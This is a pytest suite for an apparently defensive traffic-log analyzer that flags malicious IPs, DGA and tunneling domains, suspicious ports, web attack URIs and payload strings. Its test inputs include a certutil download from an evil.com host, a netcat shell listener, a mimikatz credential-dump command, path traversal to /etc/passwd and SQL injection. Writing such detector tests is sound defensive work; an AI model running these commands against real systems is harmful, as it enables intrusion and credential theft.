"""
tests/test_detectors.py
Unit tests for all detection modules.
Run with: python -m pytest tests/ -v
"""

import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

import pytest
from core.analyzer import TrafficAnalyzer

analyzer = TrafficAnalyzer()


def ioc_types(text):
    """Helper: run analyzer and return set of all ioc_type strings found."""
    results = analyzer.analyze_text(text, source="<test>")
    return {f.ioc_type for line in results.log_lines for f in line.findings}

def severities(text):
    results = analyzer.analyze_text(text, source="<test>")
    return {f.severity for line in results.log_lines for f in line.findings}


# ── IP Detection ─────────────────────────────────────────────────────────────

class TestIPDetector:
    def test_known_malicious_ip(self):
        types = ioc_types("SRC=185.220.101.1 DST=10.0.0.5 TCP")
        assert "MALICIOUS_IP" in types

    def test_private_ip_ignored(self):
        results = analyzer.analyze_text("10.0.0.1 192.168.1.1 172.16.0.1", source="<test>")
        ip_findings = [f for line in results.log_lines for f in line.findings
                       if f.ioc_type == "MALICIOUS_IP"]
        assert len(ip_findings) == 0

    def test_broadcast_ip(self):
        types = ioc_types("SRC=10.0.0.1 DST=203.0.113.255")
        assert "BROADCAST_ADDRESS" in types

    def test_tor_range(self):
        types = ioc_types("SRC=10.0.0.5 DST=185.220.101.50 DPT=443")
        # Should hit either MALICIOUS_IP or SUSPICIOUS_IP_RANGE
        assert "MALICIOUS_IP" in types or "SUSPICIOUS_IP_RANGE" in types


# ── Domain Detection ─────────────────────────────────────────────────────────

class TestDomainDetector:
    def test_known_malicious_domain(self):
        types = ioc_types("GET / HTTP/1.1 Host: malware.example.com")
        assert "MALICIOUS_DOMAIN" in types

    def test_high_risk_tld(self):
        types = ioc_types("DNS query for something.tk")
        assert "HIGH_RISK_TLD" in types

    def test_phishing_domain(self):
        types = ioc_types("GET /login HTTP/1.1 Host: paypal-secure.ru")
        assert "PHISHING_DOMAIN" in types or "HIGH_RISK_TLD" in types

    def test_dga_domain(self):
        # High-entropy long label
        types = ioc_types("DNS query for xjkqmnvbzpwlfrtdqhsw.com")
        assert "POSSIBLE_DGA" in types

    def test_dns_tunneling_depth(self):
        types = ioc_types("DNS query for a.b.c.d.e.f.evil.com")
        assert "DNS_TUNNELING_SUSPECT" in types

    def test_benign_domain_ignored(self):
        results = analyzer.analyze_text("GET / HTTP/1.1 Host: google.com", source="<test>")
        domain_findings = [f for line in results.log_lines for f in line.findings
                           if "DOMAIN" in f.ioc_type]
        assert len(domain_findings) == 0


# ── Port Detection ───────────────────────────────────────────────────────────

class TestPortDetector:
    def test_metasploit_port(self):
        types = ioc_types("SRC=10.0.0.1 DST=1.2.3.4 DPT=4444")
        assert "SUSPICIOUS_PORT" in types

    def test_back_orifice_port(self):
        types = ioc_types("connection DPT=31337")
        assert "SUSPICIOUS_PORT" in types

    def test_tor_port(self):
        types = ioc_types("DPT=9001 PROTO=TCP")
        assert "SUSPICIOUS_PORT" in types

    def test_telnet(self):
        types = ioc_types("DPT=23 PROTO=TCP")
        assert "SUSPICIOUS_PORT" in types

    def test_smb(self):
        types = ioc_types("connection to DPT=445")
        sev = severities("connection to DPT=445")
        assert "SUSPICIOUS_PORT" in types
        assert "high" in sev


# ── DNS Detection ────────────────────────────────────────────────────────────

class TestDNSDetector:
    def test_long_label_tunneling(self):
        long_label = "a" * 45
        types = ioc_types(f"DNS query for {long_label}.evil.com")
        assert "DNS_TUNNELING_LABEL" in types

    def test_base32_label(self):
        types = ioc_types("DNS query for jbswy3dpeblw64tmmq.evil.com")
        assert "DNS_TUNNELING_BASE32" in types

    def test_txt_query(self):
        types = ioc_types("DNS TXT record query for evil.com")
        assert "DNS_TXT_QUERY" in types

    def test_large_dns_response(self):
        types = ioc_types("DNS response size=3000 bytes from 8.8.8.8")
        assert "LARGE_DNS_RESPONSE" in types


# ── HTTP Detection ───────────────────────────────────────────────────────────

class TestHTTPDetector:
    def test_python_requests_ua(self):
        types = ioc_types("User-Agent: python-requests/2.28.0")
        assert "SUSPICIOUS_USER_AGENT" in types

    def test_sqlmap_ua(self):
        types = ioc_types("User-Agent: sqlmap/1.6")
        assert "SUSPICIOUS_USER_AGENT" in types
        assert "critical" in severities("User-Agent: sqlmap/1.6")

    def test_webshell_uri(self):
        types = ioc_types("GET /shell.php HTTP/1.1")
        assert "SUSPICIOUS_URI" in types

    def test_path_traversal(self):
        types = ioc_types("GET /../../etc/passwd HTTP/1.1")
        assert "SUSPICIOUS_URI" in types

    def test_sql_injection_uri(self):
        types = ioc_types("GET /page?id=1+UNION+SELECT+from+users HTTP/1.1")
        assert "SUSPICIOUS_URI" in types

    def test_ip_in_host_header(self):
        types = ioc_types("GET / HTTP/1.1\nHost: 185.220.101.1")
        assert "IP_IN_HOST_HEADER" in types

    def test_suspicious_method(self):
        types = ioc_types("TRACE /path HTTP/1.1")
        assert "SUSPICIOUS_HTTP_METHOD" in types


# ── Payload Detection ────────────────────────────────────────────────────────

class TestPayloadDetector:
    def test_powershell_encoded(self):
        types = ioc_types("powershell.exe -EncodedCommand JABjAD0ATgBlAHcALQBPAGIA")
        assert "POWERSHELL_ENCODED_CMD" in types

    def test_base64_blob(self):
        b64 = "aGVsbG8gd29ybGQgdGhpcyBpcyBhIHRlc3Qgc3RyaW5nIGZvciBtYWx3YXJl"
        types = ioc_types(f"POST /upload data={b64}")
        assert "BASE64_ENCODED_DATA" in types

    def test_mimikatz(self):
        types = ioc_types("process executed: mimikatz.exe sekurlsa::logonpasswords")
        assert "MALWARE_STRING" in types

    def test_certutil_lolbins(self):
        types = ioc_types("certutil -urlcache -f http://evil.com/payload.exe")
        assert "MALWARE_STRING" in types

    def test_netcat_reverse_shell(self):
        types = ioc_types("nc -lnvp 4444 -e /bin/bash")
        assert "MALWARE_STRING" in types


# ── Integration ───────────────────────────────────────────────────────────────

class TestIntegration:
    SAMPLE_LOG = """
2024-01-15 08:23:11 SRC=185.220.101.1 DST=10.0.0.5 PROTO=TCP DPT=4444
2024-01-15 08:23:45 DNS query for c2.darkweb.su from 10.0.0.12
2024-01-15 08:24:02 HTTP GET /gate.php?uid=aGVsbG93b3JsZA== Host: malware.example.com User-Agent: python-requests/2.28.0
2024-01-15 08:24:18 SRC=10.0.0.12 DST=91.108.4.0 PROTO=TCP DPT=9001
2024-01-15 08:25:00 DNS query for xjkqmnvbzpwlfrtdqhsw.ru from 10.0.0.8
2024-01-15 08:26:30 HTTP GET /login HTTP/1.1 Host: bankofamerica-login.ru
# This is a comment and should be ignored
2024-01-15 08:27:00 Normal traffic SRC=10.0.0.2 DST=8.8.8.8 PROTO=UDP DPT=53
"""

    def test_full_analysis(self):
        results = analyzer.analyze_text(self.SAMPLE_LOG, source="<test>")
        assert results.stats["total_lines"] > 0
        assert results.stats["total_findings"] > 0
        assert results.stats["critical"] > 0
        assert results.stats["flagged_lines"] < results.stats["total_lines"]

    def test_clean_line_not_flagged(self):
        results = analyzer.analyze_text(
            "2024-01-15 SRC=10.0.0.2 DST=8.8.8.8 PROTO=UDP DPT=53\n",
            source="<test>"
        )
        assert results.stats["total_findings"] == 0

    def test_severity_filter(self):
        results = analyzer.analyze_text(self.SAMPLE_LOG, source="<test>")
        filtered = results.filter_by_severity(["critical"])
        all_sevs = {f.severity for line in filtered.log_lines for f in line.findings}
        assert all_sevs == {"critical"}

    def test_json_output(self):
        import json
        from output.reporter import Reporter
        results = analyzer.analyze_text(self.SAMPLE_LOG, source="<test>")
        reporter = Reporter(use_color=False, output_format="json")
        output = reporter.generate(results, results.stats)
        data = json.loads(output)
        assert "findings" in data
        assert "meta" in data
        assert len(data["findings"]) > 0
